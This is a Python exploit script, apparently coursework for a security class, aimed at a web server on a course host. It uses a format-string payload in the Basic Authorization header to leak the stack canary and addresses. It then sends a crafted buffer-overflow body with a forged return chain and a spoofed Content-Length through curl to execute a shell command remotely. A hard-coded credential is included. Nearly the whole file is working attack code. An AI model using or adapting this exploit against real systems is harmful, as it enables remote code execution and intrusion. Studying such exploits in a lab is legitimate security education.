
url = "http://project-2.csec.chatzi.org:8000"
auth="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"

command = "lspci"

import subprocess
from requests import Request, Session
import base64
import time
import requests
import codecs

addr_last = None		
addr_semi_last = None	
canary = None 
addr_3rd = None	
addr_9th = None

def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
		else:
			mystring += '%c' % 0x26
	return mystring



def set_variables():
	global addr_last
	global addr_semi_last
	global canary
	global addr_3rd
	global addr_9th

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	addr_last = int(mystring[-1],16)
	addr_semi_last = int(mystring[-2],16)
	canary = int(mystring[-4],16)
	addr_3rd = int(mystring[4],16)

	addr_9th = int(mystring[-9],16)

	time.sleep(0.5)

set_variables()


guessed_address=addr_last - 0xB8	
send_file = addr_9th - 0x1AA5A0  


old_ebp = addr_last
old_esi = 0xF7F31000 #####Could be anything
old_ebx = canary


shutdown = addr_3rd - 0x1C7 + 0x32	#A few instructions after return value of post param, 



data=""
data +=  92*"!" 
data += transform_address(guessed_address + 152 + len(command))
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address)
data += 4*"-" 
data +=  transform_address(canary)
data +=  transform_address(old_ebx) 
data +=  transform_address(old_esi) 
data +=  transform_address(old_ebp)
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data +=  transform_address(guessed_address+152)
data +=  command
data += '\0'


#Here we chose to send requests with a curl command instead of through the request library.
#The request library was malfunctioning when the Content-Length was malicious


#Store payload into a temporary binary file called mybin
binary_data = bytes(data, 'latin-1')
with open('mybin', 'wb') as file:
    file.write(binary_data)


curl_command =(
	"curl -m 5 -u"
	+ auth
	+" --data-binary '@mybin' "
	+ url
	+" -H 'Content-Length: 66'"
	)

try:
	result = subprocess.run(curl_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,check=True)
except subprocess.CalledProcessError:
	exit()

content = str(result.stdout)[84:-1] #Result of the instruction

decoded_output = codecs.escape_decode(content)[0].decode() #Decode binary characters

print(decoded_output)
